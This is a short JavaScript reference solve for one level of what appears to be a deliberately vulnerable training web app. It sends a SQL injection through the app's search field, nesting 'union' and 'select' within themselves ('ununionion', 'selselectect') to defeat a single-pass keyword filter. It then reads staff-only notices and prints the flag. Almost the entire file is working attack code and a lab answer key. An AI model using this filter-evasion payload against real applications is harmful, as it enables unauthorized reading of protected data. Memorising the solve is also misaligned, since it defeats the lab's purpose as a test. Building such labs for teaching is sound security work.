// Reference solve — Mercy Clinic, Templar. Same UNION idea as Acolyte, but the search strips `union` and `select` once
// (case-insensitive) before concatenating. INJECTION nests each keyword inside itself — `ununionion` and `selselectect`
// — so the single removal pass deletes the inner copy and rebuilds `union`/`select`, then the UNION recovers the staff
// notice's body as before. The plain Acolyte payload loses its keywords here and fails. labs:test proves it.
const base = process.argv[2];
const INJECTION = "') ununionion selselectect id, title, body FROM notices WHERE visibility='staff' -- ";
const res = await fetch(`${base}/search?q=${encodeURIComponent(INJECTION)}`);
const html = await res.text();
const m = html.match(/HVWA\{[a-z2-7]{26}\}/);
if (m) console.log(m[0]);
